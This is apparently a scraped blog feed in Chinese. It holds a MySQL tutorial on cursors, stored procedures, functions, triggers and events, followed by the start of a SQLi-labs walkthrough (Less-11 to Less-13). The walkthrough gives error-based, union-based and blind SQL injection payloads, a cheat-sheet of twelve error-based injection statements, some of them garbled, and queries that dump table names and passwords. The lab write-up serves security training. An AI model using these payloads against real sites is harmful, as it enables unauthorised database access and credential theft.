<h4 id="1-声明游标"><a href="#1-声明游标" class="headerlink" title="1)声明游标"></a>1)声明游标</h4><p>语法格式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> 游标名 <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> <span class="keyword">select</span> 语句</span><br></pre></td></tr></table></figure></p>
<p>注意：select语句不能有into子句</p>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> xs_curl <span class="keyword">cursor</span> <span class="keyword">for</span></span><br><span class="line">	<span class="keyword">select</span> 学号,姓名,性别,出生日期,总学分</span><br><span class="line">		<span class="keyword">from</span> xs</span><br><span class="line">		<span class="keyword">where</span> 专业名=<span class="string">'计算机'</span>;</span><br></pre></td></tr></table></figure>
<p>注意：该语句不能单独运行，必须在存储过程或存储函数中运行。</p>
<h4 id="2-打开游标"><a href="#2-打开游标" class="headerlink" title="2)打开游标"></a>2)打开游标</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPEN 游标名</span><br></pre></td></tr></table></figure>
<h4 id="3-读取数据"><a href="#3-读取数据" class="headerlink" title="3)读取数据"></a>3)读取数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FETCH 游标名 INTO 变量名 ...</span><br></pre></td></tr></table></figure>
<p><em>fetch</em>语句是将一行数据赋给一些变量，每次已自动读取到下一行，所以变量名数量必须与<em>select</em>语句中的列数相等。</p>
<h4 id="4-关闭游标"><a href="#4-关闭游标" class="headerlink" title="4)关闭游标"></a>4)关闭游标</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLOSE 游标名</span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close xs_cur2</span><br></pre></td></tr></table></figure>
<p>下面是一些示例：</p>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> <span class="keyword">compute</span> (<span class="keyword">out</span> <span class="built_in">number</span> <span class="built_in">integer</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">declare</span> xh <span class="built_in">char</span>(<span class="number">6</span>);</span><br><span class="line">	<span class="keyword">declare</span> <span class="keyword">found</span> <span class="built_in">boolean</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">declare</span> number_xs <span class="keyword">cursor</span> <span class="keyword">for</span> </span><br><span class="line">		<span class="keyword">select</span> 学号 <span class="keyword">from</span> xs;</span><br><span class="line">	<span class="keyword">declare</span> continue <span class="keyword">handler</span> <span class="keyword">for</span> <span class="keyword">not</span> <span class="keyword">found</span></span><br><span class="line">		<span class="keyword">set</span> <span class="keyword">found</span>=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">set</span> <span class="built_in">number</span>=<span class="number">0</span>;</span><br><span class="line">	open number_xs;</span><br><span class="line">	fetch number_xs into xh;</span><br><span class="line">	while found <span class="keyword">do</span></span><br><span class="line">		<span class="keyword">set</span> <span class="built_in">number</span>=<span class="built_in">number</span>+<span class="number">1</span>;</span><br><span class="line">		fetch number_xs into xh;</span><br><span class="line">	<span class="keyword">end</span> <span class="keyword">while</span>;</span><br><span class="line">	close number_xs;</span><br><span class="line"><span class="keyword">end</span> $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<p>在MySQL 5.6以后，创建存储过程必须具有<strong><font face="宋体">CREATE ROUTINE</font></strong>权限。<br>想要查看数据库中哪些存储过程，可以使用 <code>show procedure status</code>命令，要查看具体过程，可以使用 <code>show create procedure 存储过程名</code>命令。</p>
<h2 id="存储过程的调用、删除和修改"><a href="#存储过程的调用、删除和修改" class="headerlink" title="存储过程的调用、删除和修改"></a><strong>存储过程的调用、删除和修改</strong></h2><h3 id="1、存储过程的调用"><a href="#1、存储过程的调用" class="headerlink" title="1、存储过程的调用"></a>1、存储过程的调用</h3><p>存储过程创建完毕后，可以在程序、触发器或者其他存储过程中被调用，一般使用 <font face="宋体">call</font>语句来调用。</p>
<p>语法格式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> 存储过程名 ([参数 ...])</span><br></pre></td></tr></table></figure></p>
<p>如果要调用某个数据库的存储过程，那么必须先使用这个数据库。</p>
<h3 id="2、存储过程的删除"><a href="#2、存储过程的删除" class="headerlink" title="2、存储过程的删除"></a>2、存储过程的删除</h3><p>格式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] 存储过程名</span><br></pre></td></tr></table></figure></p>
<h3 id="3、存储过程的修改"><a href="#3、存储过程的修改" class="headerlink" title="3、存储过程的修改"></a>3、存储过程的修改</h3><p>使用<strong><font face="宋体">alter procedure</font></strong> 可以修改存储过程的部分特征。<br>格式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">PROCEDURE</span> 存储过程名 [特征...]</span><br></pre></td></tr></table></figure></p>
<p>特征<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;contains sql|no sql|reads sql data|modifies sql data&#125;</span><br><span class="line">|sql security &#123;definer|invoker&#125;</span><br><span class="line">|<span class="keyword">comment</span> <span class="string">'string'</span></span><br></pre></td></tr></table></figure></p>
<p>如果想要修改存储过程的内容，可以采用先删除再重新定义存储过程的方法。</p>
<h1 id="存储函数"><a href="#存储函数" class="headerlink" title="存储函数"></a><strong>存储函数</strong></h1><p>存储函数和存储过程类似，也是由过程式语句组成的代码片段，但是，也有一些区别：</p>
<blockquote>
<p>(1)存储函数不能拥有输出参数，因为存储函数本来就是输出参数<br>(2)不能用CALL语句来调用存储函数<br>(3)存储函数必须包含一条RETURN语句，而存储过程中则不得包含。</p>
</blockquote>
<h2 id="创建存储函数"><a href="#创建存储函数" class="headerlink" title="创建存储函数"></a>创建存储函数</h2><p>查看数据库中有哪些存储函数，可以使用命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">function</span> <span class="keyword">status</span></span><br></pre></td></tr></table></figure></p>
<p>创建存储函数<br>CREATE FUNCTION语法格式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> 存储过程名 ([参数...])</span><br><span class="line">	<span class="keyword">RETURNS</span> <span class="keyword">type</span></span><br><span class="line">	[特征...] 主体</span><br></pre></td></tr></table></figure></p>
<p><strong>说明</strong> 存储函数的定义和存储过程相似。</p>
<blockquote>
<p>存储函数不能与存储过程同名<br>存储函数的参数只有名称和类型，不能指定IN,OUT,INOUT。RETURNS type声明函数返回值的数据类型。<br>主体也叫存储函数体，与存储过程中使用的一样，但是存储函数体必须包含一个 <code>RETURN value</code>,value为存储函数的返回值。</p>
</blockquote>
<p><strong><font face="宋体">example</font></strong><br>该例子返回xs表中学生的数目作为结果</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> num_of_xs()</span><br><span class="line"><span class="keyword">returns</span> <span class="built_in">integer</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> xs);</span><br><span class="line"><span class="keyword">end</span>$$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<h2 id="存储函数的调用、删除和修改"><a href="#存储函数的调用、删除和修改" class="headerlink" title="存储函数的调用、删除和修改"></a><strong>存储函数的调用、删除和修改</strong></h2><h3 id="1、存储函数的调用"><a href="#1、存储函数的调用" class="headerlink" title="1、存储函数的调用"></a>1、存储函数的调用</h3><p>存储函数和MySQL的内置函数(比如version())，所以调用存储函数可以使用 <em>select</em> 关键字。</p>
<p>语法格式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 存储函数名 ([参数[,...]])</span><br></pre></td></tr></table></figure>
<p>存储函数内部也可以调用另外一个存储函数或存储过程</p>
<h3 id="2、删除存储函数"><a href="#2、删除存储函数" class="headerlink" title="2、删除存储函数"></a>2、删除存储函数</h3><p>语法格式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] 存储过程名</span><br></pre></td></tr></table></figure></p>
<p><strong><font face="宋体">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> <span class="keyword">if</span> <span class="keyword">exists</span> num_of_xs;</span><br></pre></td></tr></table></figure>
<h3 id="3、存储函数的修改"><a href="#3、存储函数的修改" class="headerlink" title="3、存储函数的修改"></a>3、存储函数的修改</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">FUNCTION</span> 存储过程名 [特征 ...]</span><br></pre></td></tr></table></figure>
<h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a><strong>触发器</strong></h1><p>触发器不需要被调用，是一个被指定关联到一个表的数据对象，当对一个表的特别事件出现时触发器就会被自动调用。可是实现比如多个表信息的一致性，可通过定义 <em>delete</em> 触发器来实现上述功能。</p>
<h2 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h2><p>想要查看有哪些触发器使用<strong><font face="宋体">SHOW TRIGGERS</font></strong> 命令。</p>
<p>CREATE TRIGGER语法格式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器名 触发时刻 触发事件</span><br><span class="line">	<span class="keyword">ON</span> 表名 <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span> 触发器动作</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong></p>
<blockquote>
<p>触发器名称必须唯一，若要在某个特定数据库中创建，名称前要加上数据库名<br>触发器时刻，有两个选项：<code>after</code>和<code>before</code>，如果想要在激活之后执行一些语句则可以使用after，如果想要进行验证即可以使用before选项。<br>触发器事件：指明了激活触发程序语句的类型。可以是下述值之一<br><strong><font face="宋体">INSERT</font></strong> 将新行插入表时激活触发器，例如通过INSERT、LOAD DATA和REPLACE语句。<br><strong><font face="宋体">UPDATE</font></strong> 更改某一行时激活触发器。例如UPDATE语句。<br><strong><font face="宋体">DELETE</font></strong> 从表中删除某一行时激活触发器。例如，通过DELETE和REPLACE语句。<br>表名：表示在该表上激活触发程序才会激活触发器，同一个表不能拥有两个具有触发时刻和时间的表，触发时间指<em>before</em>和<em>after</em>。<br>FOR EACH ROW：这个声明用来指定对于受触发器事件影响的每一行都要激活触发器的动作。<br>包含触发器激活时将要执行的语句，可使用 <em>begin-end</em> 结构来执行多条语句。</p>
</blockquote>
<p>注意：触发器不能返回任何数据到客户端，同样也不能调用将数据返回客户端的存储过程。</p>
<p><strong><font face="宋体">example</font></strong></p>
<p>创建一个表，表中只有一列a，在表上创建一个触发器，每次插入操作时，将用户变量str的值设为“trigger is working”。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table1(a <span class="built_in">integer</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> table1_insert <span class="keyword">after</span> <span class="keyword">insert</span></span><br><span class="line">	<span class="keyword">on</span> table1 <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span></span><br><span class="line">	<span class="keyword">set</span> @<span class="keyword">str</span>=<span class="string">'trigger is working'</span>;</span><br></pre></td></tr></table></figure></p>
<p>向table1中插入一行数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table1 <span class="keyword">values</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure></p>
<p>查看str的值即可查看触发器是否触发。</p>
<p>MySQL可以关联表中的列，亦可以调用存储过程。在关联表中的列时需要注意：</p>
<blockquote>
<p>MySQL可以关联表中的任意列，但不能直接使用列的名称作为标志，那会使系统混淆。必须这样描述才可以：<strong><font face="宋体">NEW.column_name</font></strong> 或者 <strong><font face="宋体">OLD.column_name</font></strong> 。 <strong><font face="宋体">NEW.column_name</font></strong>用来引用新行的一列，<strong><font face="宋体">OLD.column_name</font></strong> 用来引用更新或删除它之前的已有行的一列。<br>对于INSERT语句来说，只有new是合法的，对于DELETE语句，只有OLD才合法，而UPDATE语句可以与OLD和NEW同时使用。</p>
</blockquote>
<p><strong><font face="宋体">example</font></strong></p>
<p>创建一个表实现关联删除的功能</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> xs_delete <span class="keyword">after</span> <span class="keyword">delete</span></span><br><span class="line">	<span class="keyword">on</span> xs <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">delete</span> <span class="keyword">from</span> xs_kc <span class="keyword">where</span> 学号=old.学号；</span><br><span class="line"><span class="keyword">end</span>$$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<p>在触发器中也可以调用存储过程。</p>
<h2 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> [schema_name.]trigger_name</span><br></pre></td></tr></table></figure>
<p>schema_name为所在数据库的名称</p>
<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a><strong>事件</strong></h1><p>自MySQL5.6之后已经开始支持事件，可能各版本的功能会有所不同，这里是简单的MySQL5.6的版本。<br>事件是MySQL在相应的时刻调用的过程式数据库对象。</p>
<p>事件的主要作用如下：</p>
<blockquote>
<p>关闭账户<br>打开或关闭数据库指示器<br>使数据库中的数据在某个间隔后刷新<br>执行对进入数据的复杂的检查工作。</p>
</blockquote>
<h2 id="创建事件"><a href="#创建事件" class="headerlink" title="创建事件"></a>创建事件</h2><p>语法格式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">EVENT</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 事件名</span><br><span class="line">	<span class="keyword">ON</span> SCHEDULE schedule</span><br><span class="line">	[<span class="keyword">ON</span> COMPLETION [<span class="keyword">NOT</span>] <span class="keyword">PRESERVE</span>]</span><br><span class="line">	[<span class="keyword">ENABLE</span>|<span class="keyword">DISABLE</span>|<span class="keyword">DISABLE</span> <span class="keyword">ON</span> <span class="keyword">SLAVE</span>]</span><br><span class="line">	[<span class="keyword">COMMENT</span> <span class="string">'comment'</span>]</span><br><span class="line">	<span class="keyword">DO</span> <span class="keyword">sql</span>语句；</span><br></pre></td></tr></table></figure></p>
<p>schedule：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AT timestamp [+INTERVAL interval]</span><br><span class="line">|EVERT interval</span><br><span class="line">[STARTS timestamp [+INTERVAL interval]]</span><br><span class="line">[ENDS timestamp [+INTERVAL interval]]</span><br><span class="line">interval:</span><br><span class="line">count &#123;YEAR|QUARTER|MONTH|DAY|HOUR|MINUTE|WEEK|SECOND|YEAR_MONTH|DAY_HOUR|DAY_MINUTE|DAY_SECOND|HOUR_MINUTE|HOUR_SECOND|MINUTE_SECOND&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong></p>
<p>schema：时间调度，表示事件何时发生或每隔多久发生一次。<br>AT子句：表示在某个时刻事件发生。timestamp表示一个具体的时间点，后面可以加上一个时间间隔，interval表示这个时间间隔，有一个数字和单位组成，count是间隔时间的数值。<br>EVERY子句：表示在指定时间间隔内每隔多长时间事件发生一次，STARTS子句设定开始时间，ENDS子句设定结束时间。<br>sql语句：时间执行代码，可以使用begin-end结构<br>时间属性：每个事件都可以定义几个属性。<br>ON COMPLETION NOT PRESERVE表示事件最后执行完之后自动删除该事件，不加NOT表示不删除。默认为有not参数</p>
<p>MySQL事件有事件调度器负责调用，打开事件调度器命令为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> EVENT_SCHEDULER=<span class="literal">TRUE</span>;</span><br></pre></td></tr></table></figure></p>
<p><strong><font face="宋体">example</font></strong><br>创建一个30秒后启动的事件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> xscj</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">event</span> afterseconds</span><br><span class="line">	<span class="keyword">on</span> schedule <span class="keyword">at</span> <span class="keyword">now</span>()+<span class="built_in">interval</span> <span class="number">30</span> <span class="keyword">second</span></span><br><span class="line">	<span class="keyword">do</span> <span class="keyword">insert</span> <span class="keyword">into</span> xs <span class="keyword">values</span>(<span class="string">'091103'</span>,<span class="string">'张建'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="修改和删除事件"><a href="#修改和删除事件" class="headerlink" title="修改和删除事件"></a>修改和删除事件</h2><p>修改事件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">EVENT</span> event_name</span><br><span class="line">	[<span class="keyword">ON</span> SCHEDULE schedule]</span><br><span class="line">	[<span class="keyword">ON</span> COMPLETION [<span class="keyword">NOT</span>] <span class="keyword">PRESERVE</span>]</span><br><span class="line">	[<span class="keyword">RENAME</span> <span class="keyword">TO</span> new_event_name]</span><br><span class="line">	[<span class="keyword">ENABLE</span>|<span class="keyword">DISABLE</span>|<span class="keyword">DISABLE</span> <span class="keyword">ON</span> <span class="keyword">SLAVE</span>]</span><br></pre></td></tr></table></figure></p>
<p>删除事件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">EVENT</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] [<span class="keyword">database</span> name.] <span class="keyword">event</span> <span class="keyword">name</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLI-LABS(Less11-Less35)]]></title>
      <url>/2018/02/09/sqli-labs2/</url>
      <content type="html"><![CDATA[<p>接上篇</p>
<a id="more"></a>
<h1 id="LESS-11"><a href="#LESS-11" class="headerlink" title="LESS-11"></a>LESS-11</h1><p>有回显，尝试报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usernae = admin'and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))#</span><br><span class="line"><span class="keyword">password</span> = <span class="keyword">admin</span><span class="string">'and 1=(updatexml(1,concat(0x3a,(select database())),1))#</span></span><br></pre></td></tr></table></figure></p>
<p>发现有回显</p>
<blockquote>
<p>XPATH syntax error: ‘:security’</p>
</blockquote>
<p>则可以得到数据库名。</p>
<hr>
<p>常用报错语句</p>
<p>1、通过floor报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></p>
<p>2、通过ExtractValue报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>)));</span><br></pre></td></tr></table></figure></p>
<p>3、通过UpdateXml报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p>
<p>4、通过NAME_CONST报错,注入语句如下:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">and</span> <span class="selector-tag">exists</span>(select*from (select*from(selectname_const(<span class="variable">@@version</span>,<span class="number">0</span>))a join (select name_const(<span class="variable">@@version</span>,<span class="number">0</span>))b)c)</span><br></pre></td></tr></table></figure></p>
<p>5、通过join报错,注入语句如下:<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.<span class="keyword">user</span> ajoin mysql.<span class="keyword">user</span> b)c;</span><br></pre></td></tr></table></figure></p>
<p>6、通过exp报错,注入语句如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> exp(~(select * <span class="keyword">from</span> (select<span class="built_in"> user </span>() ) a) );</span><br></pre></td></tr></table></figure></p>
<p>7、通过GeometryCollection()报错,注入语句如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> GeometryCollection(()select <span class="number">*f</span>rom(select<span class="built_in"> user </span>() )a)b );</span><br></pre></td></tr></table></figure></p>
<p>8、通过polygon ()报错,注入语句如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> polygon (()select * <span class="keyword">from</span>(select<span class="built_in"> user </span>())a)b );</span><br></pre></td></tr></table></figure></p>
<p>9、通过multipoint ()报错,注入语句如下:<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and </span><span class="keyword">multipoint </span>(()<span class="keyword">select </span>* from(<span class="keyword">select </span>user() )a)<span class="keyword">b </span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>10、通过multlinestring ()报错,注入语句如下:<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and </span><span class="keyword">multlinestring </span>(()<span class="keyword">select </span>* from(<span class="keyword">selectuser </span>() )a)<span class="keyword">b </span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>11、通过multpolygon ()报错,注入语句如下:<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and </span><span class="keyword">multpolygon </span>(()<span class="keyword">select </span>* from(<span class="keyword">selectuser </span>() )a)<span class="keyword">b </span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>12、通过linestring ()报错,注入语句如下:<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br></pre></td></tr></table></figure></p>
<hr>
<p>还有其他方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()#&amp;passwd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这样可以得到数据库名<br>继续爆表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>#&amp;passwd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可以得到</p>
<blockquote>
<p>Your Password:emails,referers,uagents,users<br>爆字段</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>#&amp;passwd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password<br>爆内容</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>#&amp;passwd=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h1 id="LESS-12"><a href="#LESS-12" class="headerlink" title="LESS-12"></a>LESS-12</h1><p>构造闭合语句<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin") or 1=1 limit 0,1#&amp;passwd=1</span><br></pre></td></tr></table></figure></p>
<p>后面和11关一样</p>
<h1 id="LESS-13"><a href="#LESS-13" class="headerlink" title="LESS-13"></a>LESS-13</h1><p>尝试 <code>uname=admin’&amp;passwd=1</code>,返回错误信息</p>
<blockquote>
<p>near ‘1’) LIMIT 0,1’ at line 1</p>
</blockquote>
<p>构造闭合语句<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin')#&amp;passwd=1</span><br></pre></td></tr></table></figure></p>
<p>可以成功登陆，但是无法和前面一样显示信息，故得使用盲注<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin') and left(database(),1)='s'#&amp;passwd=1</span><br></pre></td></tr></table></figure></p>
